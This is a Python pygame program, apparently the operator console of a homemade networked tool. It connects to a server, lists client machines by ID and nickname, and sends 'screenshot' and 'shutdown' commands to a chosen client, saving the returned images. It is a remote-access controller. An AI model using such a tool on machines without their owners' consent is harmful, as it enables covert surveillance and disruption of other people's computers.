import pygame
from pygame.locals import *
import time
import sys
import subprocess, os
import threading
import random
import socket
import glob
import datetime

#Find Host
#-----------------------------------------------------
f = open('host.txt', 'r')
f.seek(0)
ip = f.read()
f.close()

#Network Info
#-----------------------------------------------------
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!DISCONNECT"
PORT = 2568
SERVER = ip
ADDR = (SERVER, PORT)

#Create ID
#------------------------------------------------------
def randomNum():
    final = ''
    for i in range(5):
        final += str(random.randint(0, 9))
    return final

f = open('id.txt', 'a+')
f.seek(0)
myId = f.read()

if os.stat("id.txt").st_size == 0:
    f.write(randomNum())
    f.seek(0)
    myId = f.read()

#Connect
#-------------------------------------------------------------
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

dir_path = os.path.dirname(os.path.realpath(__file__))

#Start Pygame
#-------------------------------------------------------------
pygame.init()
screen = pygame.display.set_mode((600, 400))
clock = pygame.time.Clock()

nicknames = {}

clients = []
stop_thread = False
selected = None

noCooldown = True

class UI:
    def __init__(self):
        self.x = 300
        self.y = 20
        self.width = 270
        self.height = 355
        self.rect = pygame.Rect(self.x, self.y, self.width, self.height)
        self.font = pygame.font.SysFont('arial', 30)
        self.smallFont = pygame.font.SysFont('arial', 18)
        self.images = [pygame.image.load('resources/arrow.png'), pygame.transform.flip(pygame.image.load('resources/arrow.png'), True, False), pygame.image.load('resources/edit.png').convert_alpha(), pygame.image.load('resources/x.png').convert_alpha(), pygame.image.load('resources/nope.png')]
        self.images[0] = pygame.transform.scale(self.images[0], (30, 30))
        self.images[1] = pygame.transform.scale(self.images[1], (30, 30))
        self.images[2] = pygame.transform.scale(self.images[2], (30, 30))
        self.images[3] = pygame.transform.scale(self.images[3], (35, 35))
        self.images[4] = pygame.transform.scale(self.images[4], (180, 180))
        self.shutdownRect = pygame.Rect(self.x + self.width - 130 + 10, self.y + self.height - 60, 110, 50)
        self.screenshotRect = pygame.Rect(self.x + 10, self.y + self.height - 60, 110, 50)
        self.editRect = self.images[2].get_rect()
        self.editRect.x = self.x + self.width - self.images[2].get_width() - 5
        self.editRect.y = self.y + 5
        self.xButtonRect = self.images[3].get_rect()
        self.xButtonRect.x = self.x + 5
        self.xButtonRect.y = self.y + 5
        self.displayImagex = self.x + (self.width//2 - 190//2)
        self.displayImagey = self.y + self.y + self.height//2 - 190//2
        self.displayImageRect = pygame.Rect(self.displayImagex, self.displayImagey, 190, 130)
        

    def everything(self):
        global selected, nicknames
        if selected:
            if selected in nicknames:
                clientId = self.font.render(selected, True, [150, 150, 150])
                nick = self.font.render(nicknames[selected], True, [0, 0, 0])
                screen.blit(nick, ((self.width - nick.get_width())//2 + 300, self.y + 10))
                screen.blit(clientId, ((self.width - clientId.get_width())//2 + 300, self.y + 40))
            else: 
                clientId = self.font.render(selected, True, [0, 0, 0])
                screen.blit(clientId, ((self.width - clientId.get_width())//2 + 300, self.y + 10))
            
            #Right Arrow
            screen.blit(self.images[0], (self.x + self.width - self.images[0].get_width() - 5, 150))
            #Left Arrow----------------------------------
            screen.blit(self.images[1], (self.x + 5, 150))
            #Edit Button------------------------------
            screen.blit(self.images[2], (self.x + self.width - self.images[2].get_width() - 5, self.y + 5))
            #Shutdown Button----------------------------
            pygame.draw.rect(screen, [0, 0, 0], self.shutdownRect, 3)
            text = self.smallFont.render('Shutdown', True, [0, 0, 0])
            screen.blit(text, (self.shutdownRect.left + (self.shutdownRect.width - text.get_width())//2, self.shutdownRect.top + (self.shutdownRect.height - text.get_height())//2))
            #Screenshot Button-----------------------------
            pygame.draw.rect(screen, [0, 0, 0], self.screenshotRect, 3)
            text = self.smallFont.render('Screenshot', True, [0, 0, 0])
            screen.blit(text, (self.screenshotRect.left + (self.screenshotRect.width - text.get_width())//2, self.screenshotRect.top + (self.screenshotRect.height - text.get_height())//2))
            #X button------------------------------------
            screen.blit(self.images[3], (self.x + 5, self.y + 5))
            #Circle------------------------------
            if noCooldown:
                pygame.draw.circle(screen, [66, 245, 81], (self.x + self.width//2, self.y + self.height - 20), 8)
            else:
                pygame.draw.circle(screen, [245, 66, 66], (self.x + self.width//2, self.y + self.height - 20), 8)
            #Latest image--------------------------------
            newDir = upDir(dir_path, 'screenshots')
            image_list = []
            try:
                if os.path.exists(upDir(newDir, selected)):
                    for filename in glob.glob(f'{upDir(newDir, selected)}/*.png'):
                        image_list.append(filename)
                    if image_list:
                        lastOne = image_list[-1]
                        displayImage = pygame.image.load(lastOne)
                        displayImage = pygame.transform.scale(displayImage, (190, 130))
                
                    screen.blit(displayImage, (self.displayImagex, self.displayImagey))

                else:
                    screen.blit(self.images[4], (self.x + (self.width - self.images[4].get_width())//2, self.y + self.height//2 - self.images[4].get_width()//2 - 20))

            except:
                screen.blit(self.images[4], (self.x + (self.width - self.images[4].get_width())//2, self.y + self.height//2 - self.images[4].get_width()//2 - 20))

        else:
            writing = self.font.render('Select a Client...', True, [0, 0, 0])
            screen.blit(writing, ((self.width - writing.get_width())//2 + 300, self.y + 10))

    def draw(self):
        pygame.draw.rect(screen, [0, 0, 0], self.rect, 5)
        self.everything()

def subDir(path):
    path = path.split('\\')
    del path[-1]
    finalString = ''
    first = True
    for item in path:
        if first:
            first = not first
        else:
            finalString += '\\'
        finalString += item
    return finalString

def upDir(path, newLocation):
    path += f'\\{newLocation}'
    return path

class inputBox:
    def __init__(self, x, y, width, height):
        self.characters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
        self.x = x
        self.y = y
        self.width = width
        self.height = height
        self.rect = pygame.Rect((x, y), (width, height))
        self.font = pygame.font.SysFont('arial', 35)
        self.cursor = True
        self.going = True
        self.text = ''
        self.max = False
        # self.thread = threading.Thread(target = (self.blink)
        
    def blink(self):
        while self.going:
            time.sleep(0.5)
            self.cursor = True
            time.sleep(0.5)
            self.cursor = False
        
        sys.exit()
    
    def startBlink(self):
        t1 = threading.Thread(target = self.blink)
        t1.start()

    def draw(self):
        writing = self.font.render('Enter Nickname', True, (0, 0, 0))
        screen.blit(writing, (int((600 - writing.get_width())/2),self.y - 50))
        pygame.draw.rect(screen, [0, 0, 0], self.rect, 2)
        text = self.font.render(self.text, False, (0, 0, 0))
        if text.get_width() >= 450:
            self.text = self.text[:-1]
            text = self.font.render(self.text, False, (0, 0, 0))
        screen.blit(text, (self.x + 5, self.y + 5))
        if self.cursor:
            pygame.draw.rect(screen, [0, 0, 0], (text.get_width() + self.x + 5, self.y + 7, 2, self.height - 13))

def get_nicks():
    global nicknames, dir_path
    f = open(f'{dir_path}/nicks.txt', 'a+')
    temp = {}
    f.seek(0)
    info = f.read().splitlines()
    print(info)
    # print()
    for i in info:
        stuff = i.split(':')
        temp[stuff[0]] = stuff[1]
    nicknames = temp
    f.close()  

def send(msg):
    message = msg.encode(FORMAT)
    client.send(message)
    print('sent shit')

finalString = ''

# def parse_data():
#     global clients, stop_thread, dir_path, nicknames, finalString, selected
#     newDir = upDir(subDir(dir_path), 'server')
#     f = open(f'{newDir}/clients.txt', 'r')
#     info = f.read().splitlines()
#     clients = info
#     f.close()
#     start_time = time.time()

#     while True:
#         if time.time() - start_time >= 3:
#             # dir_path = os.path.dirname(os.path.realpath(__file__))
#             f = open(f'{newDir}/clients.txt', 'r')
#             info = f.read().splitlines()
#             clients = info
#             f.close()
#             if not clients:
#                 selected = ''
#             start_time = time.time()

#         if stop_thread:
#             sys.exit()

def nicksUpdate():
    global clients, stop_thread, dir_path, nicknames
    f = open(f'{dir_path}/nicks.txt', 'a+')
    f.truncate(0)
    first = True
    finalString = ''
    for item in nicknames:
        if first:
            finalString += f'{item}:{nicknames[item]}'
            first = False
        else:
            finalString += f'\n{item}:{nicknames[item]}'
    f.write(finalString)
    print(finalString)
    f.flush()

def recv():
    global dir_path, selected, stop_thread, clients, selected
    print('recv thread started')
    while True:
        msg = client.recv(1024).decode(FORMAT)
        if msg:
            print(msg)
            if msg.startswith('SIZE'):
                buffer_size = msg.split(' ')[-1]

            if msg == 'SENDING':
                clientId = selected
                client.send('h'.encode(FORMAT))
                image = client.recv(int(buffer_size))
                nom = str(datetime.datetime.now()).replace(':', "'")
                nom = nom.split('.')[0]
                
                newDir = upDir(dir_path, 'screenshots')
                if not os.path.exists(f'{newDir}/{clientId}'):
                    os.makedirs(f'{newDir}/{clientId}')

                myfile = open(f'{upDir(newDir, clientId)}/{nom}.png', 'wb')    
                myfile.write(image)
                myfile.close()
                print('got the file!')

            if msg.startswith('users'):
                msg = msg.split(' ')
                del msg[0]
                clients = msg
                if not clients:
                    selected = ''

        if stop_thread:
            sys.exit()

# t1 = threading.Thread(target = parse_data)
t2  = threading.Thread(target = recv)
# t1.start()
t2.start()

def boxInput():
    daBox = inputBox(70, 175, 460, 50)
    daBox.startBlink()
    go = True
    while go:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                daBox.going = False
                go = False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_RETURN:
                    daBox.going = False
                    go = False
                if event.key == pygame.K_BACKSPACE:
                    daBox.text = daBox.text[:-1]
                elif event.key == pygame.K_RETURN:
                    pass
                elif event.key == pygame.K_SPACE:
                    daBox.text += ' '
                else:
                    print(event.unicode)
                    if event.unicode.lower() in daBox.characters:
                        daBox.text += event.unicode
        
        screen.fill((255, 255, 255))
        daBox.draw()

        clock.tick(60)
        pygame.display.update()
    
    return daBox.text

rects = []

def draw_clients():
    global clients, rects, nicknames, selected
    y = 10
    rect = []
    font = pygame.font.SysFont('arial', 20)
    for client in clients:
        if client in nicknames:
            writing = f'"{nicknames[client]}" - ID:{client}'
        else:
            writing = client
        if client == selected:
            text = font.render(writing, True, [0, 0, 0], [200, 200, 200])
        else:
            text = font.render(writing, True, [0, 0, 0])
        screen.blit(text, (10, y))
        a_rect = text.get_rect()
        a_rect.x = 10
        a_rect.y = y
        rect.append(a_rect)
        y += 25
    rects = rect

start_time = time.time()

Ui = UI()
get_nicks()

send('ADMIN ' + myId)

run = True
while run:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            run = False
        if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
            pos = pygame.mouse.get_pos()
            for rect in rects:
                if rect.collidepoint(pos):
                    num = (rect.top-10)//25
                    print(num)
                    selected = clients[num]
                    print(f'{clients[num]} was clicked!')
            if Ui.editRect.collidepoint(pos):
                print('edit button clicked')
                newUsername = boxInput()
                nicknames[selected] = newUsername
                nicksUpdate()
            elif Ui.xButtonRect.collidepoint(pos):
                print('X button pressed')
                del nicknames[selected]
                nicksUpdate()
            elif Ui.screenshotRect.collidepoint(pos) and noCooldown:
                print('"Send Screenshot" Button clicked')
                start_time = time.time()
                noCooldown = not noCooldown
                send(f'screenshot {selected}')
            elif Ui.shutdownRect.collidepoint(pos) and noCooldown:
                print('"Shutdown Client" Button Clicked')
                start_time = time.time()
                noCooldown = not noCooldown
                send(f'shutdown {selected}')
            elif Ui.displayImageRect.collidepoint(pos) and selected:
                daDir = upDir(upDir(dir_path, 'screenshots'), selected)
                subprocess.Popen(f'explorer {daDir}')

    
    if not noCooldown:
        if time.time() - start_time >= 4:
            noCooldown = True

    screen.fill((255, 255, 255))
    draw_clients()
    Ui.draw()
    clock.tick(60)
    pygame.display.update()

client.send(f'{DISCONNECT_MESSAGE} {myId}'.encode(FORMAT))
stop_thread = True
sys.exit()